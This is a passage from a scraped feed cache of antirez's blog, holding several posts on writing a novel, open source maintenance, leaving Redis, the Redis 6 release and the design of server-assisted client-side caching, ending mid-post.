<br>In the first months of writing the novel, but also earlier, in the previous months, when I was preparing myself by writing long stories that I would then throw away, what happened to me often happens to those who learn to play chess. Many follow this path: they learn the rules, and that's okay, we know that you don't do much with them; the rules only allow you to move pieces legally. But then, soon after, they learn some rudiments of tactics and strategy, perhaps studying hard for a few weeks. But when they are on the board, if one move is not brutally worse or better than another, all the moves seem equivalent. The unskilled, inexperienced chess player has no real taste for moves; she fails to evaluate them not only for what they are in absolute terms, but not even according to his own idea. The result is a casual game. Only later, after many hours of play, will she finally be able to express choices that, regardless of whether they are right or wrong, have at least a coherence, they were really thought: I want to move the horse here, for these precise reasons, and for these reasons I prefer this move to all other possible ones.
<br>
<br>So whoever writes and is at the beginning, if a sentence is good, he certainly does not know it (and to continue with the above comparison, just as the chess player's game will be casual, his writing will be casual). Move a comma, change a word. Does it sound good or bad? He has ideas that he formed by writing at school and then writing as an adult, but these ideas help him little when the ambition is to write a literary level prose. The novice author does not have his own style, because before not knowing how to write he does not yet know how to read: when he reads a book he adores, he rarely understands exactly * what * happens on the page that is so convincing, and so also when he re-reads himself, he does not know if he wrote well or badly. Read, if you want to learn to write! They all say. Too bad it's not true: first of all you have to write, to learn how to write, just as you have to make short films to learn to be a director, and watching other films will not be enough (although it will certainly be useful). And to learn to write, the kind of reading that is really needed is the rereading of some books that we have chosen as models; what is useful: the rereading to fully understand its forms. Now this simple fact, of having understood what my style is, and of finally knowing how to read and have a judgment that immediately emerges when I have a work in my hands, is already more than enough compensation for the two years of writing efforts in which I have lavished.
<br>
<br>And it is fortunate that the experience itself was of such great value, because what many new authors do not know is how violent the world publishing market can be, and the Italian one in particular. In Italy a science fiction book that has a good success, published by a small or medium publisher, sells 500 copies. It has to be fine to have these numbers. Most books sell less than 100 copies. To us computer scientists these figures make us shiver. The stupidest program I wrote had ten times as many users. I would go as far as to say that the stupidest program I've written and published with a minimum of energy has had these * readers * ten times, people who have read its source code to understand how it works. I have been, and for this I thank I don't know who, a programmer of a certain notoriety, you might say. What I mean is far beyond my personal experience. Even those who are not known by anyone and try to do something on average interesting, just well described and documented, in programming, and show it around a bit, receive enormous interest compared to what belongs to the authors of fiction. The reasons are many and quite obvious, it is not even worth dwelling on them, so why am I telling you these things? For this reason:
<br>
<br>There are few activities, besides the literature, where there is the same monstrous imbalance between the forces needed to produce a work and the poor response of the public. Anyone who decides to devote a lot of time to writing must know this fact right away. Fortunately, I already knew everything, thanks to my writing friends; however, certain nuances of this irrelevance end up being difficult to accept.
<br>
<br>So why is everyone writing? The ranks of those who try their editorial fortune are overflowing. I think it's a similar mechanism to what happens in IT, with many trying to create a new programming language: failure is almost certain, but doing so is one of the most satisfying companies to devote your best energy to.
<br>
<br>Now I'm at a crossroads: I could write more prose, get back to coding, or try to keep the two activities alive at the same time. What I'll do I don't know yet. For now, let's see what happens with Wohpe, both with the Italian version and with the English translation, which a capable translator is working on right now. And on this matter of the translations, carried out with the support of the author, and what a significant experience it is from the philological point of view, maybe I will talk to you some other time (Bridget and I speak English and Italian, but we are native speakers of one and I of the other language, and this is very interesting when collaborating between translator and author). I close the post by saying to those who read me: if you feel like it, write prose! I now know for sure: it is no coincidence that for hundreds of years writing has been considered the highest art in which to try one's hand. By writing you look for things, and if you insist enough you end up really finding them.
<a href=\"http://antirez.com/news/136\">Comments</a>" nil "http://antirez.com/news/136" "f35c4a97e65b4ca693a9d50a9ec7fdab") (88 (26588 31767 78718 278000) "http://antirez.com/news/135
" "Programming and Writing " nil "Fri, 14 May 2021 09:47:18 +0000" "One year ago I paused my programming life and started writing a novel, with the illusion that my new activity was deeply different than the previous one. A river of words later, written but more often rewritten, I’m pretty sure of the contrary: programming big systems and writing novels have many common traits and similar processes.
<br>
<br>The most obvious parallel between the two activities is that in both of them you write something. Code is not prose written in a natural language, yet it has a set of fixed rules (a grammar), certain forms that most programmers will understand as natural and others that, while formally correct, will sound hard to grasp.
<br>There is, however, a much deeper connection between the two activities: a good program and a good novel are both the sum of local and global elements that work well. Good code must be composed of well written and readable single statements, but overall the different parts of the program must be orthogonal, designed in a coherent way, and have clean interactions. A good novel must also succeed in the same two scales of the micro and the macro. Sentences must be well written, but the overall structure and relationship between the parts is also crucial.
<br>
<br>A less structural link between programming and writing is in the drive you need when approaching one or the other: to succeed you need to make progresses, and to make progresses you have to be consistent. There is extensive agreement on the fact that programs and novels don’t write themselves, yet. Twenty years of writing code helped me immensely with this aspect; I knew that things happen only if you sit every day and write: one day one hundred words, the other day two thousands, but rare is the day I don’t put words on the page. And if you have written code that is not just a “filler” for a bigger system, but a creation of your own, you know that writer block also happens in programming. The only difference is that for most people you are an engineer, hence, if you don’t work, you are lazy. The same laziness, in the case of an artist, will assume the shape of a fascinating part of the creative process.
<br>
<br>The differences.
<br>
<br>I believe the most sharp difference between writing and programming is that, once written, edited and finalized, a novel remains immutable, mostly. There are several cases of writers returning on their novels after several years, publishing a bug fixed version of it, but this is rare and, even when happens, a one-shot process. Code evolves over time, is targeted by an endless stream of changes, often performed by multiple people. This simple fact has profound effects on the two processes: programmers often believe that the first version of a system can be quite imperfect; after all there will be time to make improvements. On the other hand writers know they have a single bullet for every novel, to the point that writing prose is mostly the act of rewriting. Rewriting sentences, whole chapters, dialogues that sound fake, sometimes two, three, or even ten times.
<br>
<br>I believe programming, in this regard, can learn something from writing: when writing the first core of a new system, when the original creator is still alone, isolated, able to do anything, she should pretend that this first core is her only bullet. During the genesis of the system she should rewrite this primitive kernel again and again, in order to find the best possible design. My hypothesis is that this initial design will greatly inform what will happen later: growing organically something that has a good initial structure will result in a better system, even after years of distance from the original creation, and even if the original core was just a tiny faction of the future mass the system would eventually assume.
<br>
<br>In case you are interested, a quick update about my sci-fi novel. After many self-reviews I sent the manuscript to my editor, Giulio Mozzi. He will send me the change proposals in a few weeks. I’ll start a new review process informed by his notes, and hopefully finalize the novel in one or two months. Then, finally, I’ll be ready to publish the Italian version. A the same time the finalized novel will be sent to my translator, in the US, and when she ends the translation the English version will be published as well. It’s a long journey, but one that I deeply enjoyed taking.
<a href=\"http://antirez.com/news/135\">Comments</a>" nil "http://antirez.com/news/135" "5a6a659a53041cfb856b35258521c464") (87 (26588 31767 78461 849000) "http://antirez.com/news/134
" "The open source paradox " nil "Sat, 03 Oct 2020 09:11:59 +0000" "A new idea is insinuating in social networks and programming communities. It’s the proportionality between the money people give you for coding something, and the level of demand for quality they can claim to have about your work.
<br>
<br>As somebody said, the best code is written when you are supposed to do something else [1]. Like a writer will do her best when writing that novel that, maybe, nobody will pay a single cent for, and not when doing copywriting work for a well known company, programmers are likely to spend more energies in their open source side projects than during office hours, while writing another piece of a project they feel stupid, boring, pointless. And, if the company is big enough, chances are it will be cancelled in six months anyway or retired one year after the big launch.
<br>
<br>Open source is different, it’s an artifact, it’s a transposition in code of what you really want to do, of what you feel software should be, or just of all your fun and joy, or even anger you are feeling while coding. And you want it to rock, to be perfect, and you can’t sleep at night if there is a fucking heisenbug. So if a user of your software is addressing you because some part of your code sucks, and is willing to work with you to do something about it, and is very demanding, don’t think they are abusing you because they are not paying you. It’s not about money. You can ignore bugs if you want, and ignore their complains, you can do that since you don’t have a contract to do otherwise, but they are helping you, they care about the same thing you care: your software quality, grandiosity, perfection.
<br>
<br>The real right you have, and often don’t exploit, is that you are the only one that can decide about the design of your software. So you are entitled to refuse a pull request, or a proposal to follow good practices, because you feel that what somebody is contributing does not fit in the big picture of what you are designing and building.
<br>
<br>But if you recognize that somebody is talking you about something that is, really, a defect in your software, don’t do the error of reducing the interaction to a vile matter of money. You are doing work for free, they are risking their asses deploying what you wrote, you both care about quality.
<br>
<br>EDIT: If you write OSS and you are upset about user demands, have you ever thought that maybe, at this point, your work is more similar to office work for some reason?
<br>
<br>EDIT 2: A HN user asked the reasons for such title. The paradox is that the OSS writer cares and is often willing to fix code she writes for free, more than the other paid work she does.
<br>
<br>[1] \"The best programs are the ones written when the programmer is supposed to be working on something else.\" - Melinda Varian. https://twitter.com/CodeWisdom/status/1309470447667421189
<a href=\"http://antirez.com/news/134\">Comments</a>" nil "http://antirez.com/news/134" "6b9d3d2e75bbc44adaa6c39ab1bdbd4f") (86 (26588 31767 78262 131000) "http://antirez.com/news/133
" "The end of the Redis adventure " nil "Tue, 30 Jun 2020 13:00:16 +0000" "When I started the Redis project more than ten years ago I was in one of the most exciting moments of my career. My co-founder and I had successfully launched two of the major web 2.0 services of the Italian web. In order to make them scalable we had to invent many new concepts, that were already known in the field most of the times, but we didn’t know, nor we cared to check. Problem? Let’s figure out a solution. We wanted to solve problems but we wanted, even more, to have fun. This was the playful environment where Redis was born.
<br>
<br>But now Redis is, incredibly, one of the main parts of so many things. And year after year my work changed from building this thing to making sure that it was also as useful as possible, as reliable as possible. And in recent years, what I do every day changed so much that most of my attention is spent in checking what other developers tell me about the Redis code, how to improve it, the changes it requires to be more correct or faster or more secure. However I never wanted to be a software maintainer.
<br>
<br>I write code in order to express myself, and I consider what I code an artifact, rather than just something useful to get things done. I would say that what I write is useful just as a side effect, but my first goal is to make something that is, in some way, beautiful. In essence, I would rather be remembered as a bad artist than a good programmer. Now I’m asked more and more, by the circumstances created by a project that became so important, to express myself less and to maintain the project more. And this is indeed exactly what Redis needs right now. But this is not what I want to do, and I stretched myself enough during the past years.
<br>
<br>So, dear Redis community, today I’m stepping back as the Redis maintainer. My new position will be, on one side, an “ideas” person at Redis Labs, in order to provide inputs for new Redis possibilities: I’ll continue to be part of the Redis Labs advisory board. On the other hand however my hands will be free, and I’ll do something else, that could be writing code or not, who knows, I don’t want to make plans for now. However I’m very skeptical about me not writing more code in the future. It’s just too much fun :D
<br>
<br>I leave Redis in the hands of the Redis community. I asked my colleagues Yossi Gottlieb and Oran Agra to continue to maintain the project starting from today: these are the people that helped me the most in recent years, and that tried hard, even when it was not “linear” to follow me in my very subjective point of views, to understand what my vision on Redis was. Since I don’t want to be part of how the new Redis development setup will be shaped (that is the most meta of the maintenance tasks, exactly what I want to avoid), I’ll just leave Yossi and Oran the task of understanding how to interface with the rest of the Redis developers to find a sustainable development model, you can hear directly from Yossi and Oran in this blog post: https://redislabs.com/blog/new-governance-for-redis/
<br>
<br>I believe I’m not just leaving Redis in the hands of a community of expert programmers, but also in the hands of people who care about the legacy of the community spirit of Redis. In eleven years I hope I was able to provide a point of view that certain persons understood, about an alternative way to write software. I hope that such point of view will be taken into consideration in the evolution of Redis.
<br>
<br>Redis was the most stressful thing I did in my career, and probably also the most important. I don’t like much what the underground programming world became in recent years, but even if it was not an easy journey, I had the privilege to work and interact with many great individuals. Thank you for your humanity and your help, and for what you taught me. You know who you are! I want to also say thank you to the companies and individuals inside such companies that allowed me to write open source every day for so many years, with the freedom to do what I believed to be correct for the user base. Redis Labs, VMware and Pivotal, thank you for your great help and generosity.
<br>
<br>As I said, I don’t really know what there is for me in my future, other than the involvement with the Redis advisory board. I guess that for some time, just look around is a good idea, without doing too many things. I would like to explore more a few hobbies of mine. Writing blog posts is also a major thing that I wanted to do but did less and less because of time concerns. Recently I published videos in Italian language explaining technological concepts to the general public, I had fun doing that and received good feedbacks, maybe I’ll do more of that as well. Anyway I guess some of you know that I’m active on Twitter as @antirez. If you are interested in what an old, strange programmer will do next, see you there.
<a href=\"http://antirez.com/news/133\">Comments</a>" nil "http://antirez.com/news/133" "4dd46c5746ae6a8b92a03361060ea750") (85 (26588 31767 77976 460000) "http://antirez.com/news/132
" "Redis 6.0.0 GA is out! " nil "Thu, 30 Apr 2020 13:33:35 +0000" "Finally Redis 6.0.0 stable is out. This time it was a relatively short cycle between the release of the first release candidate and the final release of a stable version. It took about four months, that is not a small amount of time, but is not a lot compared to our past records :)
<br>
<br>So the big news are the ones announced before, but with some notable changes. The old stuff are: SSL, ACLs, RESP3, Client side caching, Threaded I/O, Diskless replication on replicas, Cluster support in Redis-benchmark and improved redis-cli cluster support, Disque in beta as a module of Redis, and the Redis Cluster Proxy (now at https://github.com/RedisLabs/redis-cluster-proxy).
<br>
<br>So what changed between RC1 and today, other than stability?
<br>
<br>1. Client side caching was redesigned in certain aspects, especially the caching slot approach was discarded in favor of just using key names. After analyzing the alternatives, with the help of other Redis core team members, in the end this approach looks better. Other than that, finally the feature was completed with the things I had in the backlog for the feature, especially the “broadcasting mode”, that I believe will be one of the most popular usage modes of the feature.
<br>
<br>When broadcasting is used, the server no longer try to remember what keys each client requested. Instead clients subscribe to key prefixes: they’ll get notifications every time a key matching the prefix is modified. This means more messages (but only for the selected prefixes), but no memory effort in the server side. Moreover the opt-in / opt-out mode is now supported, so it is possible for clients not using the broadcasting mode, to exactly tell the server about what the client will cache, to reduce the number of invalidation messages. Basically the feature is now much better both when a low-memory mode is needed, and when a very selective (low-bandwidth) mode is needed.
<br>
<br>2. This was an old request by many users. Now Redis supports a mode where RDB files used for replication are immediately deleted if no longer useful. In certain environments it is a good idea to never have the data around on disk, but just in memory.
<br>
<br>3. ACLs are better in a few regards. First, there is a new ACL LOG command that allows to see all the clients that are violating the ACLs, accessing commands they should not, accessing keys they should not, or with failed authentication attempts. The log is actually in memory, so every external agent can call “ACL LOG” to see what’s going on. This is very useful in order to debug ACL problems.
<br>
<br>But my preferred feature is the reimplementation of ACL GENPASS. Now it uses SHA256 based HMAC, and accepts an optional argument to tell the server how many bits of unguessable pseudo random string you want to generate. Redis seeds an internal key at startup from /dev/urandom, and later uses the HMAC in counter mode in order to generate the other random numbers: this way you can abuse the API, and call it every time you want, since it will be very fast. Want to generate an unguessable session ID for your application? Just call ACL GENPASS. And so forth.
<br>
<br>4. PSYNC2, the replication protocol, is now improved. Redis will be able to partially resynchronize more often, since now is able to trim the final PINGs in the protocol, to make more likely that replicas and masters can find a common offset.
<br>
<br>5. Redis commands with timeouts are now much better: not only BLPOP and other commands that used to accept seconds, now accept decimal numbers, but the actual resolution was improved in order to never be worse than the current “HZ” value, regardless of the number of clients connected.
<br>
<br>6. RDB files are now faster to load. You can expect a 20/30% improvement, depending on the file actual composition (larger or smaller values). INFO is also faster now when there are many clients connected, this was a long time problem that now is finally gone.
<br>
<br>7. We have a new command, STRALGO, that implements complex string algorithms. For now the only one implemented is LCS (longest common subsequence), an important algorithm used, among the other things, in order to compare the RNA of the coronaviruses (and in general the DNA and RNA of other organisms). What is happening is too big, somewhat a trace inside Redis needed to remain.
<br>
<br>Redis 6 is the biggest release of Redis *ever*, so even if it is stable, handle it with care, test it for your workload before putting it in production. We never saw big issues so far, but make sure to be careful. As we collect bug reports, we will prepare to release Redis 6.0.1 ASAP.
<br>
<br>A big thank you to the many people that wrote code with me in this release, and to all the companies that sponsored both my work (Thanks Redis Labs), and the the work of the other contributors (Thanks other companies). Also a big thank you to the many that signaled bugs with care, sometimes following the boring process of reiterating after making some changes, or that suggested improvements of any kind.
<br>
<br>As usually you can find Redis 6 in different places: at https://redis.io as tarball, and in the Github repository tagged as “6.0.0”.
<br>
<br>Enjoy Redis 6,
<br>antirez
<a href=\"http://antirez.com/news/132\">Comments</a>" nil "http://antirez.com/news/132" "f779b420be52c16b667d1fcbff9cbff8") (84 (26588 31767 77672 251000) "http://antirez.com/news/131
" "Redis 6 RC1 is out today " nil "Thu, 19 Dec 2019 16:27:00 +0000" "So it happened again, a new Redis version reached the release candidate status, and in a few months it will hit the shelves of most supermarkets. I guess this is the most “enterprise” Redis version to date, and it’s funny since I took quite some time in order to understand what “enterprise” ever meant. I think it’s word I genuinely dislike, yet it has some meaning. Redis is now everywhere, and it is still considerably able to “scale down”: you can still download it, compile it in 30 seconds, and run it without any configuration to start hacking. But being everywhere also means being in environments where things like encryption and ACLs are a must, so Redis, inevitably, and more than thanks to me, I would say, in spite of my extreme drive for simplicity, adapted.
<br>
<br>But what’s interesting is that, even additions may be done in very opinionated ways. Redis ACLs hardly resemble something you saw in other systems, and SSL support was written in a few iterations in order to finally pick the idea that was the most sounding, from the point of view of letting the core as clean as possible. I’m quite happy with the result.
<br>
<br>Redis 6 does not bring just ACLs and SSL, it is the largest release of Redis ever as far as I can tell, and the one where the biggest amount of people participated. So, let’s start with credits. Who made Redis 6? This is the list of contributors by commits (it’s a terrible metric, but the one I can easily generate), having at least two commits, and excluding merge commits. Also note that the number of commits in my case may be inflated a lot by the fact that I fix many small stuff here and there constantly.
<br>
<br>   685  antirez
<br>    81  zhaozhao.zz
<br>    76  Oran Agra
<br>    51  artix
<br>    28  Madelyn Olson
<br>    27  Yossi Gottlieb
<br>    15  David Carlier
<br>    14  Guy Benoish
<br>    14  Guy Korland
<br>    13  Itamar Haber
<br>     9  Angus Pearson
<br>     8  WuYunlong
<br>     8  yongman
<br>     7  vattezhang
<br>     7  Chris Lamb
<br>     5  Dvir Volk
<br>     5  meir@redislabs.com
<br>     5  chendianqiang
<br>     5  John Sully
<br>     4  dejun.xdj
<br>     4  Daniel Dai
<br>     4  Johannes Truschnigg
<br>     4  swilly22
<br>     3  Bruce Merry
<br>     3  filipecosta90
<br>     3  youjiali1995
<br>     2  James Rouzier
<br>     2  Andrey Bugaevskiy
<br>     2  Brad Solomon
<br>     2  Hamid Alaei
<br>     2  Michael Chaten
<br>     2  Steve Webster
<br>     2  Wander Hillen
<br>     2  Weiliang Li
<br>     2  Yuan Zhou
<br>     2  charsyam
<br>     2  hujie
<br>     2  jem
<br>     2  shenlongxing
<br>     2  valentino
<br>     2  zhudacai 00228490
<br>     2  喜欢兰花山丘
<br>
<br>Thanks to all the above folks, it was a great team work ladies and gentlemen.
<br>The list of new features in the change log is the following:
<br>
<br>* Many new modules APIs.
<br>* Better expire cycle.
<br>* SSL
<br>* ACLs
<br>* RESP3
<br>* Client side caching
<br>* Threaded I/O
<br>* Diskless replication on replicas
<br>* Redis-benchmark cluster support + Redis-cli improvements
<br>* Systemd support rewrite.
<br>* Redis Cluster proxy was released with Redis 6 (but different repository).
<br>* A Disque module was released with Redis 6 (but different repository).
<br>
<br>Many big things, as you can see. I’ll spend a few words on selected ones.
<br>
<br>RESP3
<br>===
<br>
<br>After ten years we needed a new protocol, I talked extensively about it here http://antirez.com/news/125, but then changed my mind, so the RESP3 protocol in Redis 6 is “opt in”. The connection starts in RESP2 mode, and only if you do a handshake using the new HELLO command, you enter in the new protocol mode.
<br>
<br>Why a new protocol? Because the old one was not semantical enough. There are other features in RESP3, but the main idea was the ability to return complex data types from Redis directly, without the client having to know in what type to convert the flat arrays returned, or the numbers returned instead of proper boolean values, and so forth.
<br>
<br>Since RESP3 is not the only protocol supported I expect the adoption to be slower than expected, but maybe this is not a bad thing after all: we’ll have time to adapt.
<br>
<br>ACLs
<br>===
<br>
<br>The best introduction to Redis ACLs is the ACL documentation itself (https://redis.io/topics/acl), even if probably it needs some update to match the last minute changes. So it’s more interesting to talk about motivations here. Redis needed ACLs because people need ACLs in bigger environments, in order to control better which client can do certain operations. But another main point about adding ACLs to Redis was isolation in order to defend the data against application bugs. If your worker can only do BRPOPLPUSH, the chance of the new developer adding for debugging a FLUSHALL that ends in production code for error and creates a nightmare for 5 hours, is lower.
<br>
<br>ACLs in Redis are for free, both operationally, because if you don’t use them, you can avoid knowing they are supported at all, and from the point of view of performances, since the overhead is not measurable. I guess it’s a good deal to have them. Bonus point, we have a Redis modules interface for ACLs now, so you can write custom authentication methods.
<br>
<br>SSL
<br>===
<br>
<br>It’s 2019, almost 2020, and there are new regulations. The only problem was doing it right. And doing it right required doing it wrong, understanding the limitations, and then abstracting the Redis connections in order to do it right. This work was entirely performed without my help, which shows how the Redis development process changed in recent times.
<br>
<br>Client side caching
<br>===
<br>
<br>I blogged about it here http://antirez.com/news/130, however I think that right now this is the most immature feature of Redis 6. Yep, it’s cool that the server can assist you in caching client side values, but I want to improve this before Redis 6 GA is out. Especially it could be very good to add a new mode that requires the server to maintain no state about clients, or very little state at all, and trade this with more messages. Moreover right now the messages to expire certain “cache slots” can’t be compiled in a single one. There is more work to do in January about this feature, but it will be a good one.
<br>
<br>Disque as a module
<br>===
<br>
<br>Finally I did it :-) https://github.com/antirez/disque-module, and I’m very happy with the result.
<br>Disque as a module really shows how powerful is the Redis module system at this point. Cluster message bus APIs, ability to block and resume clients, timers, AOF and RDB control of module private data. If you don’t know what Disque is, check the repository: the README is quite extensive.
<br>
<br>Cluster Proxy
<br>===
<br>
<br>My colleague Fabio worked for months at this Redis Cluster proxy: https://github.com/artix75/redis-cluster-proxy.
<br>It is ages that I want to see it happening, the client landscape is very fragmented when the topic is Redis Cluster support, so now we have a (work in progress) proxy that can do many interesting things. The main one is to abstract the Redis Cluster for clients, like if they were talking to a single instance. Another one is to perform multiplexing, at least when it is simple and clients just use simple commands and features. When there is to block or to perform transactions, the proxy allocates a different set of connections for the client. The proxy is also completely threaded, so it can be a good way in order to maximize the CPU usage in case most of your CPU time is spent in I/O. Check the project README for status and give it a try!
<br>
<br>Modules
<br>===
<br>
<br>With Redis 6 the modules API is totally at a new level. This is one of the part of Redis that matured faster in our history, because Redis Labs used the modules system from day zero in order to develop very complex stuff, not just trivial examples. Some time ago I started the Disque port, and this also motivated to bring me new features to the modules system. The result is that Redis is really a framework in order to write systems as modules, without having to invent everything from scratch, and being BSD licensed, Redis is really an open platform to write systems.
<br>
<br>Internals
<br>===
<br>
<br>There are tons of improvements to the Redis internals: the way commands are replicated changed quite a bit, the expires are now using a different algorithm which is faster and more cache obvious.
<br>
<br>Status and ETA
<br>===
<br>
<br>Today we went RC1, and I hope that between end of March, or at worst, May, you’ll see the GA ready.
<br>Right now Redis 6 is definitely testable and the chance you run into a bug is very small. Yet it includes a ton of code changes, and the new features are composed of new code that nobody ran in production before. So if you find bad things, please report them in the issue system describing at your best what happened.
<br>
<br>Thanks everybody that made this release possible and that will work in the next months to bring it to a very stable state.
<br>
<br>Oh, I almost forgot! This is the LOLWUT command interactive art for version 6:
<br>
<br>img://antirez.com/misc/lolwut6.png
<br>
<br>Every run displays a different landscape that is randomly generated.
<a href=\"http://antirez.com/news/131\">Comments</a>" nil "http://antirez.com/news/131" "9e9acc4fd2bbaa31a82870d563200ce7") (83 (26588 31767 77191 284000) "http://antirez.com/news/130
" "Client side caching in Redis 6 " nil "Thu, 04 Jul 2019 17:10:34 +0000" "[Note: this post no longer describes the client side implementation in the final implementation of Redis 6, that changed significantly, see https://redis.io/topics/client-side-caching]
<br>
<br>The New York Redis day was over, I get up at the hotel at 5:30, still pretty in sync with the Italian time zone and immediately went walking on the streets of Manhattan, completely in love with the landscape and the wonderful feeling of being just a number among millions of other numbers. Yet I was thinking at the Redis 6 release with the feeling that, what was probably the most important feature at all, the new version of the Redis protocol (RESP3), was going to have a very slow adoption curve, and for good reasons: wise people avoid switching tools without very good reasons. After all why I wanted to improve the protocol so badly? For two reasons mainly, to provide clients with more semantical replies, and in order to open to new features that were hard to implement with the old protocol; one feature in particular was the most important to me: client side caching.
<br>
<br>Rewind back to about one year ago. I arrived at Redis Conf 2018, in San Francisco, with the firm idea that client side caching was the most important thing in the future of Redis. If we need fast stores and fast caches, then we need to store a subset of the information inside the client. It is a natural extension of the idea of serving data with small delays and at a big scale. Actually almost every very large company already does it, because it is the only way to survive to the load eventually. Yet Redis had no way to assist the client in such process. A fortunate coincidence wanted Ben Malec having a talk at Redis Conf exactly about client side caching [1], just using the tools that Redis provides and a number of very clever ideas.
<br>
<br>[1] https://www.youtube.com/watch?v=kliQLwSikO4
<br>
<br>The approach taken by Ben really opened my imagination. There were two key ideas Ben used in order to make his design work. The first was to use the Redis Cluster idea of “hash slots” in order to divide keys into 16k groups. That way clients would not need to track the validity of each key, but could use a single metadata entry for a group of keys. Ben used Pub/Sub in order to send the notifications when keys where changed, so he needed some help by the application in all its parts, however the schema was very solid. Modify a key? Also publish a message invalidating it. On the client side, are you caching keys? Remember the timestamp at which you cache each key, and also when receiving invalidation messages, remember the invalidation time for each slot. When using a given cached key, do a lazy eviction, by checking if the key you cached has a timestamp which is older than the timestamp of the invalidation received for the slot this key belongs to: in that case the key is stale data, you have to ask the server again.
<br>
<br>After watching the talk, I realized that this was a great idea to be used inside the server, in order to allow Redis to do part of the work for the client, and make client side caching simpler and more effective, so I returned home and wrote a document describing my design [2].
<br>
<br>[2] https://groups.google.com/d/msg/redis-db/xfcnYkbutDw/kTwCozpBBwAJ
<br>
<br>But to make my design working I had to focus on switching the Redis protocol to something better, so I started writing the specification and later the code for RESP3, and the other Redis 6 things like ACL and so forth, and client side caching joined the huge room of the many ideas for Redis that I abandoned in some way or the other for lack of time.
<br>
<br>Yet I was among the streets of New York thinking about this idea. Later went to lunch and coffee break with friends from the conference. When I returned to my hotel room I had all the evening left, and most of the next day before the flight, so I started writing the implementation of client side caching for Redis 6, closely following the proposal I wrote to the group one year ago: it still looked great.
<br>
<br>Redis server-assisted client side caching, finally called “tracking” (but I may change idea), is a very simple feature composed of just a few key ideas.
<br>
<br>The key space is split into “caching slots”, but they are a lot more than the hash slots used by Ben. We use 24 bits of the output of CRC64, so there are a bit more than 16 millions different slots. Why so much? Because I think you want to have a server with 100 millions of keys, and yet an invalidation message should not affect more than a few keys in the client side cache. The memory overhead inside Redis to take the invalidation table is 130 megabyte: an array of 8 bytes pointers to 16M entries. That’s ok with me, if you want the feature you are going to make a great use of all the memory you have in the clients, so to use 130MB server side is fine; what you win is a much more fine grained invalidation.
<br>
<br>Clients enable the feature in an “opt in” way, with a simple command:
<br>
<br>    CLIENT TRACKING on
<br>
<br>The server replies the good old +OK, and starting from that moment, every command that is flagged as “read only” in the command table, will not just return the keys to the caller, it will also, as a side effect, remember the caching slots of all the keys the client requested so far (but only the ones using a read only command, that's the agreement between the server and the client). The way Redis stores this information is simple. Each Redis client has an unique ID, so if client ID 123 performs an MGET about keys hashing to the slot 1, 2, and 5, we’ll have the Invalidation Table with the following entry:
<br>
<br>1 -> [123]
<br>2 -> [123]
<br>5 -> [123]
<br>
<br>But later also client ID 444 will ask about keys in the slot 5, so the table will be like:
<br>
<br>5 -> [123, 444]
<br>
<br>Now some other client changes some key in the slot 5. What happens is that Redis will check the Invalidation Table, to find that both clients 123 and 444 may have cached keys on that slot. We’ll send an invalidation message to both clients, as a result they will be free to deal with it in any form: either remember with a timestamp the last time the slot was invalidate, and check later in a lazy way the timestamp (or incremental “epoch” if you like it more: it is safer) of the cached object, and evict it based on the comparison. Otherwise the client is free to reclaim the objects directly, by taking a table of what it cached about this specific slot. This approach with a 24 bit hash function is not an issue, because we’ll not have a very long list at all, even when caching tens of millions of keys. After sending the invalidation messages, we can remove the entries from the invalidation table, this way we'll no longer send invalidation messages to those clients until they don't read again keys for such slot.
<br>
<br>Note that clients are not forced to really use all the 24 bits of the hash function. They may just use, for instance, 20 bits, and then also shift the invalidation messages slots that Redis sends them. Not sure if there are many good reasons to do that, but in memory constrained systems may be an idea.
<br>
<br>If you followed closely what I said, you are thinking that the same connection receives both the normal client replies, and the invalidation messages. This is possible with RESP3, because invalidations are sent as “push” message types. Yet if the client is a blocking one, and not an event driven client, this starts to be complex: the application need some way to read new data from time to time, and that looks complex and fragile. It is perhaps, in that case, much better to use another application thread, and a different client connection, in order to receive the invalidation messages. So you are allowed to do the following:
<br>
<br>    CLIENT TRACKING on REDIRECT 1234
<br>
<br>Basically we can say that all the keys we get with the current connection, we want the invalidation message to be sent to client 1234 instead. Multiple clients may ask to have the invalidation messages redirected to a single client for instance, in case of connection pools. All you need to do is to create this special connection to receive the invalidation messages, call CLIENT ID to know which ID this client connection has, and later enable tracking.
<br>
<br>There is one problem left: what happens if we lose the connection with the server from the invalidation link? We may run into troubles since invalidation messages will no longer be received. Normally the application will detect the link is severed, and will reconnect again, flushing the current cache (or taking more soft resolutions, like putting all the timestamps for the slots a few seconds in the future to have some time to populate the cache while serving data that may be a few seconds stale). Yet it may be a better idea if the invalidation thread pings from time to time the connection to make sure it is alive. However in order to reduce the risk of stale data, Redis will also start to inform the clients that redirected the invalidation messages to some other client, that is now disconnected, about the situation, just using special push messages: at the next query performed the client will know.
<br>
<br>What I described was just merged into Redis unstable. Probably it’s not the final word, but we have more months before the first Redis 6 release candidate, there is time to change everything: just send me your feedbacks. I’m also looking at ways to enable the feature for RESP2. That would work only when redirection is enabled, and the client listening for messages should probably go into Pub/Sub mode so that we could send kinda of Pub/Sub messages. In this way old clients can be fully reused.
<br>
<br>I hope this was enough to stimulate your appetite: if we execute this inside Redis very well, and then document it for the client authors to know how to provide support, data may go a lot nearer to the application than ever, even in applications ran by small teams that so far avoided trying to implement client side caching. For large teams and very large applications doing this already, the overhead could be reduced, together with the complexity of the implementation.
<a href=\"http://antirez.com/news/130\">Comments</a>" nil "http://antirez.com/news/130" "be4700b8f3da44b037862366f53f25cc") (82 (26588 31767 76675 833000) "http://antirez.com/news/129
" "The struggles of an open source maintainer " nil "Thu, 16 May 2019 17:42:18 +0000" "Months ago the maintainer of an OSS project in the sphere of system software, with quite a big and active community, wrote me an email saying that he struggles to continue maintaining his project after so many years, because of how much psychologically taxing such effort is. He was looking for advices from me, I’m not sure to be in the position of giving advices, however I told him I would write a blog post about what I think about the matter. Several weeks passed, and multiple times I started writing such post and stopped, because I didn’t had the time to process the ideas for enough time. Now I think I was able to analyze myself to find answers inside my own weakness, struggles, and desire of freedom, that inevitably invades the human minds when they do some task, that also has some negative aspect, for a prolonged amount of time. Maintaining an open source project is also a lot of joy and fun and these latest ten years of my professional life are surely memorable, even if not the absolute best (I had more fun during my startup times after all). However here I’ll focus on the negative side; simply make sure you don’t get the feeling it is just that, there is also a lot of good in it.
<br>
<br>Flood effect
<br>
